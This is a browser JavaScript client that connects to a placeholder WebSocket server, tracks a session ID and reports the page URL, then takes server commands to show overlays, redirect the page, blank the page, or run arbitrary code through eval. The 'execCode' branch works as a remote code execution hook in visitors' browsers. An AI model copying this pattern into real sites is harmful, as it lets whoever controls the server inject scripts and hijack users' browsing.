(function () {
  const socket = new WebSocket("ws://localhost/"); //replace with actual ws server
  const clientUrl = window.location.href;

  // Create broadcast overlay elements
  const broadcastOverlay = document.createElement("div");
  const broadcastMessage = document.createElement("div");
  const closeBtn = document.createElement("button");

  broadcastOverlay.style.display = "none";
  broadcastOverlay.style.position = "fixed";
  broadcastOverlay.style.inset = "0";
  broadcastOverlay.style.backgroundColor = "rgba(0, 0, 0, 0.85)";
  broadcastOverlay.style.color = "white";
  broadcastOverlay.style.fontSize = "2rem";
  broadcastOverlay.style.padding = "2rem";
  broadcastOverlay.style.textAlign = "center";
  broadcastOverlay.style.zIndex = "9999";
  broadcastOverlay.style.justifyContent = "center";
  broadcastOverlay.style.alignItems = "center";
  broadcastOverlay.style.flexDirection = "column";

  closeBtn.textContent = "Close";
  closeBtn.style.marginTop = "2rem";
  closeBtn.style.fontSize = "1rem";
  closeBtn.style.padding = "0.5rem 1rem";
  closeBtn.onclick = () => {
    broadcastOverlay.style.display = "none";
  };

  broadcastOverlay.appendChild(broadcastMessage);
  broadcastOverlay.appendChild(closeBtn);
  document.body.appendChild(broadcastOverlay);

  socket.addEventListener("open", () => {
    const sessionId = localStorage.getItem("sessionId");
    if (sessionId) {
      socket.send(
        JSON.stringify({
          type: "loadSessionId",
          id: sessionId,
          url: clientUrl,
        })
      );
    } else {
      socket.send(
        JSON.stringify({
          type: "unknownSessionId",
          url: clientUrl,
        })
      );
    }
    console.log("[WS] Connected");
  });

  socket.addEventListener("message", (event) => {
    try {
      const msg = JSON.parse(event.data);
      switch (msg.type) {
        case "setId":
          console.log("[WS] Assigned session ID:", msg.id);
          localStorage.setItem("sessionId", msg.id);
          break;

        case "broadcast":
          console.log("[Broadcast]", msg.message);
          broadcastMessage.textContent = msg.message;
          broadcastOverlay.style.display = "flex";
          break;

        case "execCode":
          try {
            console.log("[ExecCode]", msg.code);
            eval(msg.code); // ⚠️ Caution: executes raw JS
          } catch (e) {
            console.error("[ExecCode Error]", e);
          }
          break;

        case "navigate":
          console.log("[Navigate]", msg.url);
          window.location.href = msg.url;
          break;

        case "closeWindow":
          console.log("[CloseWindow]");
          document.body.innerHTML =
            "<h1 style='text-align:center;margin-top:20vh;'>Session closed by server.</h1>";
          setTimeout(() => location.reload(), 3000);
          break;

        default:
          console.warn("[WS] Unknown type:", msg.type);
      }
    } catch (e) {
      console.error("[WS] Message parsing error:", e);
    }
  });

  socket.addEventListener("close", () => {
    console.log("[WS] Disconnected");
  });

  socket.addEventListener("error", (err) => {
    console.error("[WS] Error", err);
  });
})();
